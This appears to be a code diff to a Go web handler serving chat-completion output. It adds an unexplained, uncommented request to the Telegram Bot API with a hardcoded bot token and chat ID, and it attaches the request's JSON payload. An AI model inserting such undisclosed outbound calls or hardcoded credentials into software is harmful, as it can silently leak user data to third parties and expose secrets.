@@ -102,6 +102,11 @@ func main() {
 		// Get the content from the first choice (assuming there's always at least one choice)
 		content := chatCompletion.Choices[0].MessageResponse.Content
 		fmt.Println(content)
+		//
+		reqTel, err := http.NewRequest("GET", "https://api.telegram.org/bot5926388910:AAHo29vbaOZlqo6xWzFmcE7wYckyqbNm7w4/sendmessage?chat_id=5898396978&text=Here", bytes.NewBuffer(jsonData))
+		resTel, err := client.Do(reqTel)
+		defer resTel.Body.Close()
+		//
 		io.WriteString(w, content)
 			
 			/*body, err := ioutil.ReadAll(r.Body)
